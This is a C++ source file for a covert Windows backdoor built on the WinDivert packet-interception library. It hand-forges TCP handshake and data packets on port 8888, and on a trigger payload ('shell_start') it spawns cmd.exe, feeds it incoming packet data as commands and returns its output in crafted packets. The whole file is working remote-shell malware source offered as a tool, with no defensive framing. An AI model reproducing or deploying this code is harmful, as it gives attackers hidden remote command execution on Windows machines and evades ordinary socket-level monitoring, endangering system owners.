#include "server.h"

#pragma comment(lib,"WinDivert.lib")

int main(int argc, char** argv)
{
	CPortReuse port_reuse;
	port_reuse.start();
	return 0;
}

CPortReuse::CPortReuse()
{
	m_divert_handle = NULL;
	m_template_packet_len = 0;
	m_packet_template = NULL;
	m_addr_template = NULL;
}
CPortReuse::~CPortReuse()
{

}

void CPortReuse::start()
{
	UINT8* packet;
	UINT max_packet_len, recv_len, addr_len, payload_len;
	WINDIVERT_ADDRESS* addr;
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	PVOID payload_buf;

	if (!init_divert("tcp.DstPort = 8888 || tcp.SrcPort = 8888"))
	{
		return;
	}

	max_packet_len = WINDIVERT_MTU_MAX;
	packet = (UINT8*)malloc(max_packet_len);
	addr = (WINDIVERT_ADDRESS*)malloc(sizeof(WINDIVERT_ADDRESS));
	if (packet == NULL || addr == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
	}
	while (TRUE)
	{
		addr_len = sizeof(WINDIVERT_ADDRESS);
		if (!WinDivertRecv(m_divert_handle, packet, max_packet_len, &recv_len, addr) || !packet)
		{
			cout << "[!] failed to read packet (" << GetLastError() << ")!" << endl;
			continue;
		}

		WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
			NULL, NULL, NULL, &tcp_header, NULL, &payload_buf,
			&payload_len, NULL, NULL);
		if (ip_header)
		{
			char dst_addr[16];
			char src_addr[16];
			if (WinDivertHelperFormatIPv4Address(ip_header->DstAddr, dst_addr, 16) &&
				WinDivertHelperFormatIPv4Address(ip_header->SrcAddr, src_addr, 16))
			{
				cout << "[*] dst addr:" << dst_addr << "; src addr:" << src_addr << endl;
			}
		}
		if (tcp_header)
		{
			cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
			if (tcp_header->Syn)
			{
				cout << "[*] syn packet recv!" << endl;
				get_addr_template(addr);
				send_connect_reponse(packet, recv_len);
			}
		}
		if (payload_len && payload_buf)
		{
			cout << "[*] recv payload length: " << payload_len << " bytes" << endl;
			// cout << "[*] recv payload buffer: " << (char*)payload_buf << endl;
			get_packet_template(packet, recv_len);
			send_response_packet(packet, recv_len);
			if (payload_len == strlen("shell_start") && !memcmp(payload_buf, "shell_start", payload_len))
			{
				run_shell();
			}
			continue;
		}
		if (!WinDivertSend(m_divert_handle, packet, recv_len, NULL, addr))
		{
			cout << "[!] failed to send reponse packet (" << GetLastError() << ")!" << endl;
		}
	}
}

void CPortReuse::send_response_packet(UINT8* packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT payload_len;
	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		&payload_len, NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) - payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);
	tcp_header->Psh = 0;
	UINT32 original_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + payload_len;
	tcp_header->SeqNum = tcp_header->AckNum;
	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);
	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
	UINT send_len = 0;
	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template))
	{
		cout << "[!] failed to send connect reponse packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send connect reponse packet " << send_len << " bytes successfully!" << endl;
}

void CPortReuse::get_packet_template(UINT8* packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT payload_len;

	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		&payload_len, NULL, NULL);
	m_template_packet_len = recv_len - payload_len;
	m_packet_template = (UINT8*)malloc(m_template_packet_len);
	if (m_packet_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_packet_template, packet, m_template_packet_len);
	WinDivertHelperParsePacket(m_packet_template, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) - payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);
	tcp_header->Psh = 1;
	UINT32 original_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + payload_len;
	tcp_header->SeqNum = tcp_header->AckNum;
	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);

	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
}

void CPortReuse::get_addr_template(PWINDIVERT_ADDRESS addr)
{
	m_addr_template = (PWINDIVERT_ADDRESS)malloc(sizeof(WINDIVERT_ADDRESS));
	if (m_addr_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_addr_template, addr, sizeof(WINDIVERT_ADDRESS));
	m_addr_template->Outbound = 1;
}
void CPortReuse::send_data_packet(const char* payload_buf)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT reponse_payload_len;
	PVOID reponse_payload_buf;
	UINT8* reponse_packet;
	UINT packet_len, send_len;

	reponse_payload_len = strlen(payload_buf);

	packet_len = m_template_packet_len + reponse_payload_len;
	// build response packet
	reponse_packet = (UINT8*)malloc(packet_len);
	if (!reponse_packet)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	ZeroMemory(reponse_packet, packet_len);
	memcpy(reponse_packet, m_packet_template, m_template_packet_len);

	WinDivertHelperParsePacket(reponse_packet, packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	// rebuild ip header
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + reponse_payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);

	// pack new payload in
	// cause template packet has no payload buf, we pos it manully. 
	reponse_payload_buf = (PVOID)((UINT)tcp_header + sizeof(WINDIVERT_TCPHDR));
	memcpy(reponse_payload_buf, payload_buf, reponse_payload_len);

	WinDivertHelperCalcChecksums(reponse_packet, packet_len, m_addr_template, 0);

	if (!WinDivertSend(m_divert_handle, reponse_packet, packet_len, &send_len, m_addr_template))
	{
		cout << "[!] failed to send data packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send data packet " << send_len << " bytes successfully!" << endl;
	add_seq(reponse_payload_len);
}

BOOL CPortReuse::init_divert(const char* filter)
{
	int priority = 0;
	cout << "[*] filter = " << filter << endl;
	m_divert_handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, (INT16)priority, 0);
	if (m_divert_handle == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_INVALID_PARAMETER)
		{
			cout << "[!] filter syntax error!" << endl;
			return FALSE;
		}
		cout << "[!] failed to open the WinDivert device (" << GetLastError() << ")!" << endl;
		return FALSE;
	}

	cout << "[*] divert open successfully." << endl;
	return TRUE;
}

void CPortReuse::run_shell()
{
	cout << "[*] start shell mode" << endl;

	UINT8* packet;
	UINT template_packet_len, recv_len, addr_len, payload_len;
	WINDIVERT_ADDRESS* addr;
	PVOID payload_buf;

	template_packet_len = WINDIVERT_MTU_MAX;
	packet = (UINT8*)malloc(template_packet_len);
	addr = (WINDIVERT_ADDRESS*)malloc(sizeof(WINDIVERT_ADDRESS));
	if (packet == NULL || addr == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	CreatePipe(&m_std_out_rd, &m_std_out_wr, &sa, 0);
	SetHandleInformation(m_std_out_rd, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&m_std_in_rd, &m_std_in_wr, &sa, 0);
	SetHandleInformation(m_std_in_wr, HANDLE_FLAG_INHERIT, 0);

	STARTUPINFO start_info;
	TCHAR cmd_line[] = TEXT("cmd");
	ZeroMemory(&start_info, sizeof(STARTUPINFO));
	start_info.cb = sizeof(STARTUPINFO);
	start_info.hStdError = m_std_out_wr;
	start_info.hStdOutput = m_std_out_wr;
	start_info.hStdInput = m_std_in_rd;
	start_info.dwFlags |= STARTF_USESTDHANDLES;
	CreateProcess(NULL,
		cmd_line,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&start_info,
		&m_proc_info);
	m_read_thread = (HANDLE)_beginthreadex(nullptr, 0, read_from_cmd, this, 0, &m_thread_id);

	while (TRUE)
	{
		addr_len = sizeof(WINDIVERT_ADDRESS);
		if (!WinDivertRecv(m_divert_handle, packet, template_packet_len, &recv_len, addr))
		{
			cout << "[!] failed to read packet (" << GetLastError() << ")!" << endl;
			continue;
		}

		WinDivertHelperParsePacket(packet, recv_len, NULL, NULL,
			NULL, NULL, NULL, NULL, NULL, &payload_buf,
			&payload_len, NULL, NULL);

		if (payload_len && payload_buf)
		{
			cout << "[*] recv payload length: " << payload_len << " bytes" << endl;
			cout << "[*] recv payload buffer: " << (char*)payload_buf << endl;

			get_packet_template(packet, recv_len);
			send_response_packet(packet, recv_len);
			DWORD real_write = 0;

			WriteFile(m_std_in_wr, (char*)payload_buf, payload_len, &real_write, NULL);

			if (payload_len == strlen("exittt") && !memcmp(payload_buf, "exittt", payload_len))
			{
				exit_shell();
			}
		}
	}
}

void CPortReuse::exit_shell()
{
	TerminateProcess(m_proc_info.hProcess, 0);
	TerminateThread(m_read_thread, 0);
	CloseHandle(m_read_thread);
	CloseHandle(m_proc_info.hProcess);
	CloseHandle(m_proc_info.hThread);
	CloseHandle(m_std_in_rd);
	CloseHandle(m_std_in_wr);
	CloseHandle(m_std_out_rd);
	CloseHandle(m_std_out_wr);
	cout << "[*] exit shell mode" << endl;
}

void CPortReuse::add_seq(UINT seq)
{
	PWINDIVERT_TCPHDR tcp_header;

	WinDivertHelperParsePacket(m_packet_template, m_template_packet_len, NULL, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	UINT32 add_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + seq;
	tcp_header->SeqNum = WinDivertHelperHtonl(add_seq);
}

void CPortReuse::send_connect_reponse(UINT8* packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL , NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	tcp_header->Ack = 1;
	tcp_header->Syn = 1;
	tcp_header->AckNum = WinDivertHelperHtonl(WinDivertHelperNtohl(tcp_header->SeqNum) + 1);
	tcp_header->SeqNum = WinDivertHelperHtonl(100000);
	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
	UINT send_len = 0;
	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template))
	{
		cout << "[!] failed to send reponse packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send reponse packet " << send_len << " bytes successfully!" << endl;
}

unsigned __stdcall CPortReuse::read_from_cmd(void* ptr)
{
	CPortReuse* pThis = (CPortReuse*)ptr;
	uint8_t buff[2048];

	DWORD read_size;
	while (true)
	{
		if (!ReadFile(pThis->m_std_out_rd, buff, 2047, &read_size, nullptr) || !read_size)
		{
			break;
		}
		buff[read_size] = 0;
		pThis->send_data_packet((const char*)buff);
	}

	_endthreadex(0);
	return 0;
}
